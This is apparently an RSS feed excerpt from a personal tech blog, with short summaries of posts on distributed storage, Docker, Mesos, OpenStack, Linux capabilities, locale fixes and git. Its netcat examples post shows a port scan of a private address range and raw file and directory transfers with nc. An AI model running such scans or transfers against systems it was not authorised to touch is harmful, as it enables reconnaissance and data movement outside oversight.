&lt;li>&lt;a href="https://google.com/">Google GFS&lt;/a> - distributed filesystem.&lt;/li>
&lt;li>&lt;a href="http://research.google.com/pubs/pub36971.html">Google Megastore&lt;/a> - scalable, highly available storage.&lt;/li>
&lt;li>&lt;a href="http://www.gridgain.org/">GridGain&lt;/a> - GGFS, Hadoop compliant in-memory file system.&lt;/li>
&lt;li>&lt;a href="http://wiki.lustre.org/">Lustre file system&lt;/a> - high-performance distributed filesystem.&lt;/li>
&lt;li>&lt;a href="https://www.quantcast.com/engineering/qfs/">Quantcast File System QFS&lt;/a> - open-source distributed file system.&lt;/li>
&lt;li>&lt;a href="http://www.gluster.org/">Red Hat GlusterFS&lt;/a> - scale-out network-attached storage file system.&lt;/li>
&lt;li>&lt;a href="http://tachyon-project.org/">Tachyon&lt;/a> - reliable file sharing at memory speed across cluster frameworks.&lt;/li>
&lt;/ul>
&lt;h2 id="document-data-model">Document Data Model&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://www.actian.com/products/operational-databases/">Actian Versant&lt;/a> - commercial object-oriented database management systems .&lt;/li>
&lt;li>&lt;a href="https://crate.io/">Crate Data&lt;/a> - is an open source massively scalable data store. It requires zero administration.&lt;/li>
&lt;li>&lt;a href="http://www.infoq.com/news/2014/06/facebook-apollo">Facebook Apollo&lt;/a> - Facebook’s Paxos-like NoSQL database.&lt;/li>
&lt;li>&lt;a href="http://comsysto.github.io/jumbodb/">jumboDB&lt;/a> - document oriented datastore over Hadoop.&lt;/li>
&lt;li>&lt;a href="http://data.linkedin.com/projects/espresso">LinkedIn Espresso&lt;/a> - horizontally scalable document-oriented NoSQL data store.&lt;/li>
&lt;li>&lt;a href="http://www.marklogic.com/">MarkLogic&lt;/a> - Schema-agnostic Enterprise NoSQL database technology.&lt;/li>
&lt;li>&lt;a href="http://www.mongodb.org/">MongoDB&lt;/a> - Document-oriented database system.&lt;/li>
&lt;li>&lt;a href="http://www.ravendb.net/">RavenDB&lt;/a> - A transactional, open-source Document Database.&lt;/li>
&lt;li>&lt;a href="http://www.rethinkdb.com/">RethinkDB&lt;/a> - document database that supports queries like table joins and group by.&lt;/li>
&lt;/ul>
&lt;h2 id="key-map-data-model">Key Map Data Model&lt;/h2>
&lt;p>&lt;strong>Note&lt;/strong>: There is some term confusion in the industry, and two different things are called &amp;ldquo;Columnar Databases&amp;rdquo;. Some, listed here, are distributed, persistent databases built around the &amp;ldquo;key-map&amp;rdquo; data model: all data has a (possibly composite) key, with which a map of key-value pairs is associated. In some systems, multiple such value maps can be associated with a key, and these maps are referred to as &amp;ldquo;column families&amp;rdquo; (with value map keys being referred to as &amp;ldquo;columns&amp;rdquo;).&lt;/p></description></item><item><title>cannot change locale</title><link>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</guid><description>&lt;p>运行locale命令&lt;span id="more-912">&lt;/span>&lt;br>
LANG=&lt;br>
LANGUAGE=&lt;br>
LC_CTYPE=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_NUMERIC=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_TIME=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_COLLATE=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_MONETARY=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_MESSAGES=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_PAPER=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_NAME=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_ADDRESS=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_TELEPHONE=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_MEASUREMENT=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_IDENTIFICATION=&amp;ldquo;POSIX&amp;rdquo;&lt;br>
LC_ALL=&lt;/p>
&lt;p>修改profile&lt;/p>
&lt;p>vi /etc/profile&lt;/p>
&lt;p>添加如下内容&lt;/p>
&lt;p>export LC_ALL=en_US.UTF-8&lt;/p>
&lt;p>source /etc/profile&lt;/p>
&lt;p>得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory&lt;br>
 运行 dpkg-reconfigure locales&lt;/p>
&lt;p>得到错误&lt;/p>
&lt;p>perl: warning: Setting locale failed.&lt;br>
perl: warning: Please check that your locale settings:&lt;br>
        LANGUAGE = (unset),&lt;br>
        LC_ALL = &amp;ldquo;en_US.UTF-8&amp;rdquo;,&lt;br>
        LANG = &amp;ldquo;en_US.UTF-8&amp;rdquo;&lt;br>
    are supported and installed on your system.&lt;br>
perl: warning: Falling back to the standard locale (&amp;ldquo;C&amp;rdquo;).&lt;br>
locale: Cannot set LC_CTYPE to default locale: No such file or directory&lt;br>
locale: Cannot set LC_MESSAGES to default locale: No such file or directory&lt;br>
locale: Cannot set LC_ALL to default locale: No such file or directory&lt;br>
/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)&lt;/p></description></item><item><title>Deploy a Mesos Cluster Using Docker</title><link>https://feisky.xyz/posts/2015-02-05-deploy-a-mesos-cluster-using-docker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-05-deploy-a-mesos-cluster-using-docker/</guid><description>&lt;p>his tutorial will show you how to bring up a single node &lt;a href="http://mesosphere.com/">Mesos&lt;/a> cluster all provisioned out using &lt;a href="http://docker.io/">Docker&lt;/a> containers (a future post will show how to easily scale this out to multi nodes or see the update on the bottom). This means that you can startup an entire cluster with 7 commands! Nothing to install except for starting out with a working Docker server.&lt;/p>
&lt;p>This will startup 4 containers:&lt;/p>
&lt;ol>
&lt;li>ZooKeeper&lt;/li>
&lt;li>Meso Master&lt;/li>
&lt;li>Marathon&lt;/li>
&lt;li>Mesos Slave Container&lt;/li>
&lt;/ol>
&lt;p>As mentioned the only prerequisite is to have a working Docker server. This means you can bring up a local &lt;a href="https://docs.vagrantup.com/v2/provisioning/docker.html">Vagrant box with Docker installed&lt;/a>, use &lt;a href="http://boot2docker.io/">Boot2Docker&lt;/a>, use &lt;a href="https://coreos.com/">CoreOS&lt;/a>, instance on AWS, or however you like to get a Docker server.&lt;/p></description></item><item><title>Dive in Linux capabilites</title><link>https://feisky.xyz/posts/2015-03-03-dive-in-linux-capabilites/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-03-dive-in-linux-capabilites/</guid><description>&lt;h3 id="introduction">Introduction&lt;/h3>
&lt;p>Capabilities in Linux are flags that tell the kernel what the application is allowed to do, If you have no additional security mechanism in place, the Linux root user has all capabilities assigned to it. As capabilities are a way for running processes with some privileges, without having the need to grant them root privileges, it is important to understand that they exist.&lt;/p>
&lt;p>Consider the ping utility. It is marked setuid root on some distributions, because the utility requires the (cap)ability to send raw packets. This capability is known as CAP_NET_RAW. However, thanks to capabilities, you can now mark the ping application with this capability and drop the setuid from the file. As a result, the application does not run with full root privileges anymore, but with the restricted privileges of the user plus one capability, namely the CAP_NET_RAW.&lt;/p></description></item><item><title>Docker</title><link>https://feisky.xyz/posts/2015-01-27-docker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-docker/</guid><description>&lt;h3 id="简介">简介&lt;/h3>
&lt;p>Docker 是 dotCloud 最近几个月刚宣布的开源引擎，旨在提供一种应用程序的自动化部署解决方案，简单的说就是，在 Linux 系统上迅速创建一个容器（类似虚拟机）并在容器上部署和运行应用程序，并通过配置文件可以轻松实现应用程序的自动化安装、部署和升级，非常方便。因为使用了容器，所以可以很方便的把生产环境和开发环境分开，互不影响，这是 docker 最普遍的一个玩法。更多的玩法还有大规模 web 应用、数据库部署、持续部署、集群、测试环境、面向服务的云计算、虚拟桌面 VDI 等等。&lt;/p></description></item><item><title>Docker acquires SDN startup SocketPlane</title><link>https://feisky.xyz/posts/2015-03-05-docker-acquires-sdn-startup-socketplane/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-05-docker-acquires-sdn-startup-socketplane/</guid><description>&lt;p>At &lt;a href="http://socketplane.io/">Socketplane&lt;/a> we started out as four guys with a collectively strong belief in open source and open communities.  We aligned around a shared vision that we wanted to be a critical part of Docker’s once in a decade disruption. Now that we are &lt;a href="http://www.businesswire.com/news/home/20150304005595/en/Docker-Acquires-SocketPlane-Drive-Open-Collaborative-Networking#.VPcQAVPF-Tk">part of the Docker team&lt;/a>, we couldn’t be happier.&lt;/p>
&lt;p>We never looked to hedge our bets, our success was and obviously still is tied to the success of Docker. While there are many reasons that we decided to join the team, first and foremost Docker is unlike any other projects we have worked on in the past; the focus on user experience and simplicity is unmatched. Our early work with Docker during the open network design sprints gave us clear indications that the Docker maintainers were interested in being good open source stewards for the networking community in a project with an already staggering community of users and contributors. We also saw a genuine desire from Docker leadership to do right by both, individual contributors and the ecosystem. That made it all the more easy to jump in head first.&lt;/p></description></item><item><title>docker in tencent</title><link>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</guid><description>&lt;p>腾讯内部对Docker有着广泛的使用，其基于Yarn的代号为Gaia的调度平台可以同时兼容Docker和非Docker类型的应用，并提供高并发任务调度和资源管理，它具有高度可伸缩性和可靠性，能够支持MR等离线业务。&lt;/p></description></item><item><title>docker internal</title><link>https://feisky.xyz/posts/2015-01-27-docker-internal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-docker-internal/</guid><description>&lt;p>&lt;/style>&lt;title>docker-base&lt;/title>&lt;/head>&lt;body>&lt;h2 id="abstract">Abstract&lt;/h2>&lt;/p>
&lt;p>本文在现有文档的基础上总结了以下几点内容&lt;/p>
&lt;ol>
&lt;li>
&lt;p>docker的介绍，包括由来、适用场景等&lt;/p>
&lt;/li>
&lt;li>
&lt;p>docker背后的一系列技术 - namespace, cgroup, lxc, aufs等&lt;/p>
&lt;/li>
&lt;li>
&lt;p>docker在利用LXC的同时提供了哪些创新&lt;/p></description></item><item><title>git commit修改前一次提交的方法</title><link>https://feisky.xyz/posts/2015-06-05-git-commit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-05-git-commit/</guid><description>&lt;p>方法一：用–amend选项&lt;/p>
&lt;pre tabindex="0">&lt;code>#修改需要修改的地方。
git add .
git commit –amend
&lt;/code>&lt;/pre>&lt;p>注：这种方式可以比较方便的保持原有的Change-Id，推荐使用。&lt;/p>
&lt;p>方法二：先reset，再修改&lt;/p>
&lt;p>这是可以完全控制上一次提交内容的方法。但在与Gerrit配合使用时，需特别注意保持同一个commit的多次提交的Change-Id是不变的。为了保持提交到Gerrit的Change不变，需要复制对应的Change-Id到commit msg的最后，可以到Gerrit上对应的Change去复制.&lt;/p></description></item><item><title>Going Native with OpenStack Centric Applications: Murano</title><link>https://feisky.xyz/posts/2015-02-26-going-native-with-openstack-centric-applications-murano/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-26-going-native-with-openstack-centric-applications-murano/</guid><description>&lt;p>Following on our previous discussion surveying the projects supporting applications within OpenStack, let’s continue our review with an in-depth look at the OpenStack-native Application Catalog: Murano, currently an incubation status project, having seen its functionality and core services integration advanced over the past few OpenStack releases.&lt;/p>
&lt;h3 id="what-is-it">What is it?&lt;/h3>
&lt;p>An application catalog developed by Mirantis, HP and others (now including Cisco), that allows application developers and cloud administrators to publish applications in a categorized catalog to be perused and deployed by application consumers. The selection of applications available within the catalog is intended to be that of released versions (ready-state) of applications (cloud-native or enterprise-architected), not application versions that are mid-development. Ideally, these are applications ready to be consumed and run by application users.&lt;/p></description></item><item><title>Hello World</title><link>https://feisky.xyz/posts/2015-01-20-hello-world/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-20-hello-world/</guid><description>&lt;p>Welcome to &lt;a href="https://hexo.io/">Hexo&lt;/a>! This is your very first post. Check &lt;a href="https://hexo.io/docs/">documentation&lt;/a> for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href="https://hexo.io/docs/troubleshooting.html">troubleshooting&lt;/a> or you can ask me on &lt;a href="https://github.com/hexojs/hexo/issues">GitHub&lt;/a>.&lt;/p>
&lt;h2 id="quick-start">Quick Start&lt;/h2>
&lt;h3 id="create-a-new-post">Create a new post&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo new &lt;span style="color:#e6db74">&amp;#34;My New Post&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/writing.html">Writing&lt;/a>&lt;/p>
&lt;h3 id="run-server">Run server&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/server.html">Server&lt;/a>&lt;/p>
&lt;h3 id="generate-static-files">Generate static files&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo generate
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/generating.html">Generating&lt;/a>&lt;/p>
&lt;h3 id="deploy-to-remote-sites">Deploy to remote sites&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo deploy
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/deployment.html">Deployment&lt;/a>&lt;/p></description></item><item><title>How enable OpenStack allinone vm to access external network</title><link>https://feisky.xyz/posts/2015-03-02-how-enable-openstack-allinone-vm-to-access-external-network/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-02-how-enable-openstack-allinone-vm-to-access-external-network/</guid><description>&lt;p>首先需要为OpenStack添加一个公网网络，假设All-in-one环境建的公网网段为10.10.10.0/24，公网网关为10.10.10.1。这样为虚拟机绑定公网IP后，由于网关是不存在的，虚拟机无法访问外网。那虚拟机如果想访问外网怎么办呢？&lt;/p></description></item><item><title>How to disable ubuntu services</title><link>https://feisky.xyz/posts/2015-03-18-how-to-disable-ubuntu-services/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-18-how-to-disable-ubuntu-services/</guid><description>&lt;p>To toggle a service from starting or stopping permanently you would need to:&lt;/p>
&lt;pre>&lt;code>echo manual | sudo tee /etc/init/SERVICE.override
&lt;/code>&lt;/pre>
&lt;p>where the stanza manual will stop Upstart from automatically loading the service on next boot. Any service with the .override ending will take precedence over the original service file. You will only be able to start the service manually afterwards. If you do not want this then simply delete the .override. For example:&lt;/p></description></item><item><title>How to use docker compose to deploy a flask app</title><link>https://feisky.xyz/posts/2015-02-12-how-to-use-docker-compose-to-deploy-a-flask-app/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-12-how-to-use-docker-compose-to-deploy-a-flask-app/</guid><description>&lt;p>The flask app is very simple, you have an index page where your can write and read comments.&lt;/p>
&lt;h2 id="to-start">To start&lt;/h2>
&lt;p>So what we need ?&lt;/p>
&lt;p>In my case a &lt;a href="https://www.digitalocean.com/?refcode=16e2312f412e" title="Digital Ocean">Digital Ocean&lt;/a> droplet (I&amp;rsquo;m using Fedora 21).&lt;/p>
&lt;p>So, first of all we connect to our vm with ssh.&lt;/p>
&lt;pre class="code literal-block">
&lt;span class="nv">$ &lt;/span>ssh root@yourvmip
&lt;/pre>
&lt;p>Now that we are inside we need to install git, Docker and docker-compose.&lt;/p>
&lt;pre class="code literal-block">
&lt;span class="nv">$ &lt;/span>yum -y install git docker python-pip
&lt;span class="nv">$ &lt;/span>pip install docker-compose&lt;span class="o">==&lt;/span>1.1.0-rc2
&lt;span class="nv">$ &lt;/span>systemctl start docker
&lt;span class="nv">$ &lt;/span>systemctl &lt;span class="nb">enable &lt;/span>docker
&lt;/pre>
&lt;p>That&amp;rsquo;s all we need to play with Docker.&lt;/p></description></item><item><title>Hypernetes The multi tenant Kubernetes distribution</title><link>https://feisky.xyz/posts/2015-11-04-hypernetes---the-multi-tenant-kubernetes-distribution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-11-04-hypernetes---the-multi-tenant-kubernetes-distribution/</guid><description>&lt;p>&amp;ldquo;&lt;a href="https://hyper.sh/blog/post/2015/07/06/the-caas-revolution.html">The Caas Revolution&lt;/a>&amp;rdquo;. This is what we believe is happening today in the Cloud ecosystem. This revolution has been started by the now famous project (and company) &lt;a href="http://www.docker.com/">Docker&lt;/a>, and embraced by Cloud providers like &lt;a href="https://cloud.google.com/container-engine/">Google&lt;/a> and &lt;a href="https://aws.amazon.com/ecs/">AWS&lt;/a>.&lt;/p>
&lt;p>However, most multi-tenant CaaS solutions today run on a public IaaS, and use fully isolated virtual machine clusters to schedule containers. This is in contrast to the solely container-based implementation provided in private CaaS deployments. The public “hybrid” VM/container isolation approach is a direct result from the shared kernel architecture in container technology.&lt;/p></description></item><item><title>Hypernetes wechat share</title><link>https://feisky.xyz/posts/2015-11-12-hypernetes-wechat-share/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-11-12-hypernetes-wechat-share/</guid><description>&lt;p>今天给大家介绍下最近在Hypernetes上做的工作。&lt;/p>
&lt;p>Hypernetes是一个真正多租户的Kubernetes Distro。&lt;/p>
&lt;p>Hypernetes在Kubernetes基础上增加了多租户认证授权、容器SDN网络、基于Hyper的容器执行引擎以及基于Cinder的持久化存储等。&lt;/p></description></item><item><title>Installing nova docker on OpenStack Juno</title><link>https://feisky.xyz/posts/2015-02-13-installing-nova-docker-on-openstack-juno/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-13-installing-nova-docker-on-openstack-juno/</guid><description>&lt;p>This post comes about indirectly by a request on IRC in #rdo for help getting nova-docker installed on Fedora 21. I ran through the process from start to finish and decided to write everything down for posterity.&lt;/p>
&lt;p>Getting started
I started with the Fedora 21 Cloud Image, because I&amp;rsquo;m installing onto OpenStack and the cloud images include some features that are useful in this environment.&lt;/p>
&lt;p>We&amp;rsquo;ll be using OpenStack packages from the RDO Juno repository. Because there is often some skew between the RDO packages and the current Fedora selinux policy, we&amp;rsquo;re going to start by putting SELinux into permissive mode (sorry, Dan):&lt;/p></description></item><item><title>Installing Realtek rltwifi driver for Ubuntu 14.10</title><link>https://feisky.xyz/posts/2015-02-15-installing-realtek-rltwifi-driver-for-ubuntu-1410/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-15-installing-realtek-rltwifi-driver-for-ubuntu-1410/</guid><description>&lt;h3 id="安装方法">安装方法&lt;/h3>
&lt;p>Ubuntu 14默认内核版本没有带RTL8192ee的网卡驱动，因而就无法通过无线网络联网，并且Reltek官方网站也没有提供合适的驱动。而最新的Linux内核已经带了相应驱动，所以一般建议修复的方法就是升级内核版本到最新。但如果不想内核升级咋办呢？幸好Github上已经有人将这个驱动写好了，直接安装即可：&lt;/p></description></item><item><title>Integrating Openstack and Kubernetes with Murano</title><link>https://feisky.xyz/posts/2015-02-26-integrating-openstack-and-kubernetes-with-murano/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-26-integrating-openstack-and-kubernetes-with-murano/</guid><description>&lt;p>There’s a perceived competition between OpenStack and containers such as Docker, but in reality, the two technologies are a powerful combination. They both solve similar problems, but on different layers of the stack, so combining the two can give users more scalability and automation than ever before.&lt;/p>
&lt;p>That containers app you wrote needs to run somewhere. This is particularly true for orchestrated container applications, such as those managed by Kubernetes. What’s more, if your application is complicated enough that it needs to scale up and down, you need to be running it in an environment that can, itself, scale up and down. This is where OpenStack comes in.&lt;/p></description></item><item><title>Linux kernel network call flow</title><link>https://feisky.xyz/posts/2015-03-04-linux-kernel-network-call-flow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-04-linux-kernel-network-call-flow/</guid><description>&lt;p>&lt;img src="https://feisky.xyz/images/network_flow.jpg" alt="">&lt;/p>
&lt;p>Refer &lt;a href="http://blog.csdn.net/night_elf_1020/article/details/19935813">http://blog.csdn.net/night_elf_1020/article/details/19935813&lt;/a>&lt;/p></description></item><item><title>Linux netcat examples</title><link>https://feisky.xyz/posts/2015-02-12-linux-netcat-examples/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-12-linux-netcat-examples/</guid><description>&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;p>nc -z -v -n 172.31.100.7 21-25&lt;/p>
&lt;h3 id="chat-server">Chat Server&lt;/h3>
&lt;p>Server: nc -l 1567&lt;/p>
&lt;p>Client: nc 172.31.100.7 1567&lt;/p>
&lt;h3 id="文件传输">文件传输&lt;/h3>
&lt;p>Server to Client:&lt;/p>
&lt;p>Server: nc -l 1567 &amp;lt; file.txt&lt;/p>
&lt;p>Client: nc -n 172.31.100.7 1567 &amp;gt; file.txt&lt;/p>
&lt;p>Client to Server:&lt;/p>
&lt;p>Server: nc -l 1567 &amp;gt; file.txt&lt;/p>
&lt;p>Client: nc 172.31.100.23 1567 &amp;lt; file.txt&lt;/p>
&lt;h3 id="目录传输">目录传输&lt;/h3>
&lt;p>Server: tar -cvf - dir_name | nc -l 1567&lt;/p>
&lt;p>Client: nc -n 172.31.100.7 1567 | tar -xvf -&lt;/p>
&lt;h3 id="视频播放">视频播放&lt;/h3>
&lt;p>Server: cat video.avi | nc -l 1567&lt;/p></description></item><item><title>Microservice Infrastructure</title><link>https://feisky.xyz/posts/2015-03-17-microservice-infrastructure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-17-microservice-infrastructure/</guid><description>&lt;h2 id="microservices-infrastructure">Microservices Infrastructure&lt;/h2>
&lt;p>Modern platform for rapidly deploying globally distributed services provided by cisco.&lt;/p>
&lt;p>&lt;a href="https://github.com/CiscoCloud/microservices-infrastructure">https://github.com/CiscoCloud/microservices-infrastructure&lt;/a>&lt;/p>
&lt;h2 id="features">Features&lt;/h2>
&lt;ul>
&lt;li>the ability to deploy applications utilizing resources across multiple datacenters (and even clouds),&lt;/li>
&lt;li>deploying in a decentralized control model,&lt;/li>
&lt;li>supporting intelligent endpoints,&lt;/li>
&lt;li>heavy automation, and&lt;/li>
&lt;li>the on-demand nature of deploying these services to support business requirements and scale.&lt;/li>
&lt;/ul>
&lt;h2 id="architectural-overview">Architectural Overview&lt;/h2>
&lt;ul>
&lt;li>Mesos cluster manager for efficient resource isolation and sharing across distributed services&lt;/li>
&lt;li>Marathon for cluster management of long running containerized services&lt;/li>
&lt;li>Consul for service discovery (By using Consul&amp;rsquo;s inbuilt DNS server)&lt;/li>
&lt;li>Docker container runtime supported by Marathon&lt;/li>
&lt;li>Multi-datacenter support&lt;/li>
&lt;li>High availablity&lt;/li>
&lt;/ul>
&lt;h2 id="single-data-center-architecture">Single Data Center Architecture&lt;/h2>
&lt;p>The base platform contains control nodes that manage the cluster and any number of compute nodes. Containers automatically register themselves into DNS so that other services can locate them.&lt;/p></description></item><item><title>Mininet links</title><link>https://feisky.xyz/posts/2015-06-04-mininet-links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-04-mininet-links/</guid><description>&lt;p>Introduction to Mininet: &lt;a href="http://mininet.org/walkthrough/">http://mininet.org/walkthrough/&lt;/a>&lt;/p>
&lt;p>OpenFlow Tutorial: &lt;a href="https://github.com/mininet/openflow-tutorial/wiki">https://github.com/mininet/openflow-tutorial/wiki&lt;/a>&lt;/p>
&lt;p>Mininet walkthrough: &lt;a href="http://mininet.org/walkthrough/">http://mininet.org/walkthrough/&lt;/a>&lt;/p>
&lt;p>RYU SDN Framework: &lt;a href="http://osrg.github.io/ryu-book/en/html/">http://osrg.github.io/ryu-book/en/html/&lt;/a>&lt;/p>
&lt;p>A good ryu blog: &lt;a href="http://linton.tw/">http://linton.tw/&lt;/a>&lt;/p></description></item><item><title>Open vSwitch over DPDK on Ubuntu</title><link>https://feisky.xyz/posts/2015-03-02-open-vswitch-over-dpdk-on-ubuntu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-02-open-vswitch-over-dpdk-on-ubuntu/</guid><description>&lt;p>There are two approaches for using DPDK acceleration in DPDK. One is the openvswitch fork from intel, called dpdk-ovs the other is done directly in openvswitch with a different approach from intel. &lt;span class="anchor" id="line-10">&lt;/span>
&lt;span class="anchor" id="line-11">&lt;/span>&lt;span class="anchor" id="line-12">&lt;/span>&lt;/p>
&lt;ul>
&lt;li>&lt;a href="http://dpdk.org/ml/archives/dev/2014-March/001770.html">http://dpdk.org/ml/archives/dev/2014-March/001770.html&lt;/a> &lt;span class="anchor" id="line-13">&lt;/span>
&lt;span class="anchor" id="line-14">&lt;/span>- &lt;a href="https://github.com/01org/dpdk-ovs">https://github.com/01org/dpdk-ovs&lt;/a> &lt;span class="anchor" id="line-15">&lt;/span>&lt;span class="anchor" id="line-16">&lt;/span>&lt;/li>
&lt;/ul>
&lt;h2 id="virtualbox-preparations">VirtualBox preparations&lt;span class="anchor" id="line-17">&lt;/span>&lt;/h2>
&lt;p>To run openvswitch with DPDK I used a virtual machine (&lt;a href="https://wiki.linaro.org/VirtualBox">VirtualBox&lt;/a>) because the NIC I had on my laptop was not supported. I created three virtual NICs for my vm, one behind NAT to use it to ssh into the vm from the host, and two in host-only mode, to be use for testing. &lt;span class="anchor" id="line-18">&lt;/span>&lt;span class="anchor" id="line-19">&lt;/span>&lt;/p></description></item><item><title>OpenStack Magnum社区及项目介绍</title><link>https://feisky.xyz/posts/2015-06-24-openstack-magnum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-24-openstack-magnum/</guid><description>&lt;p>&lt;img src="https://feisky.xyz/images/magnum.png" alt="">&lt;/p>
&lt;p>Add network management for native docker &lt;a href="https://blueprints.launchpad.net/magnum/+spec/native-docker-network">https://blueprints.launchpad.net/magnum/+spec/native-docker-network&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://etherpad.openstack.org/p/magnum-native-docker-network">https://etherpad.openstack.org/p/magnum-native-docker-network&lt;/a>&lt;/p>
&lt;p>From &lt;a href="http://dockone.io/article/445">http://dockone.io/article/445&lt;/a>&lt;/p></description></item><item><title>OVS 2.0 call flow</title><link>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-04-ovs-20-call-flow/</guid><description>&lt;p>&lt;img src="https://feisky.xyz/images/ovs_flow.jpg" alt="">&lt;/p>
&lt;p>Refer &lt;a href="http://blog.csdn.net/night_elf_1020/article/details/37600791">http://blog.csdn.net/night_elf_1020/article/details/37600791&lt;/a>&lt;/p></description></item><item><title>Perform Consistent Snapshots with qemu guest agent</title><link>https://feisky.xyz/posts/2015-02-10-perform-consistent-snapshots-with-qemu-guest-agent/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-10-perform-consistent-snapshots-with-qemu-guest-agent/</guid><description>&lt;p>A while back, I &lt;a href="http://www.sebastien-han.fr/blog/2012/12/10/openstack-perform-consistent-snapshots/">wrote an article&lt;/a> about taking consistent snapshots of your virtual machines in your OpenStack environment.
However this method was really intrusive since it required to be inside the virtual machine and to manually summon a filesystem freeze.
In this article, I will use a different approach to achieve the same goal without the need to be inside the virtual machine.&lt;/p>
